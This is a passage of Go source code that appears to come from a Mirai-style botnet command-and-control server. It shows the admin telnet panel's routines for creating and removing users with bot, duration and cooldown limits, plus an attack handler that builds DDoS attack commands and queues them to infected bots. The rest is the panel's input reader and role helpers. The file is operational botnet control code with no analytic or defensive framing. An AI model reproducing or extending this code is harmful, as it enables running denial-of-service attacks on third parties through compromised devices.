			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("[37mUsername\033[36m: " + new_un + "\r\n"))
			this.conn.Write([]byte("[37mPassword\033[36m: " + new_pw + "\r\n"))
			this.conn.Write([]byte("[37mDuration\033[36m: " + duration_str + "\r\n"))
			this.conn.Write([]byte("[37mCooldown\033[36m: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("[37mNetwork\033[36m: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("[37mConfirm\033[36m: "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte("\033[36mFailed to create User! \r\n"))
			} else {
				this.conn.Write([]byte("\033[36mUser created! \r\n"))
			}
			continue
		}
		if isAdmin(userInfo) && cmd == strings.ToLower("removeuser") {
			this.conn.Write([]byte("[37mUsername\033[36m: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if !database.removeUser(new_un) {
				this.conn.Write([]byte("\033[0;91mUser doesn't exists.\033[0m\r\n"))
			} else {
				this.conn.Write([]byte("\033[0;92mUser removed\033[0m\r\n"))
			}
			continue
		}

		/* ═══════════════ COMMANDS END ═══════════════ */

		/* ═══════════════ ATTACK ═══════════════ */

		botCount = userInfo.maxBots
		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\033[37m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[39m%s\033[37m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\033[39m%s\033[37m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					this.conn.Write([]byte("\033[36mAttack sent successfully! \r\n"))
				} else {
					//no whitelist.
					//his.conn.Write([]byte(f))
				}
			}
		}
		/* ═══════════════ ATTACK END ═══════════════ */
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 500000)
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\033' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}

func isAdmin(userInfo AccountInfo) bool {
	if userInfo.admin == 1 {
		return true
	}
	return false
}

func getRank(userInfo AccountInfo) string {
	if userInfo.admin == 1 {
		return "Admin"
	}
	return "User"
}
